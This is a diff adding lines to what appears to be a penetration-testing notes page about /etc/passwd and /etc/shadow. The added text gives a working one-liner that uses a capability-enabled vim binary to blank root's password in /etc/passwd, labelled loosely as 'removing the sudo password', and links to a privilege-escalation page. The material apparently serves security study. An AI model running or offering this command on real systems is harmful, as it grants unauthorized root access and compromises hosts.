@@ -815,6 +815,10 @@ cat /etc/passwd
 _Service accounts usually have `/usr/sbin/nologin` or `/bin/false` as their shell in `/etc/passwd` — this blocks interactive login even if someone obtains the password._
 {% endhint %}
 
+Execute this for removing the sudo password: `echo -e ':%s/^root:[^:]*:/root::/\nwq!' | /usr/bin/vim.basic -es /etc/passwd`&#x20;
+
+Note that the executable that we're using must have capabilities set. check [here](../../../infrastructure/privilege-escalation/linux-privilege-escalation.md#case-2) for the case.&#x20;
+
 ### Shadow file
 
 `/etc/shadow` stores the actual password hashes and aging policy. It's readable only by **root**.
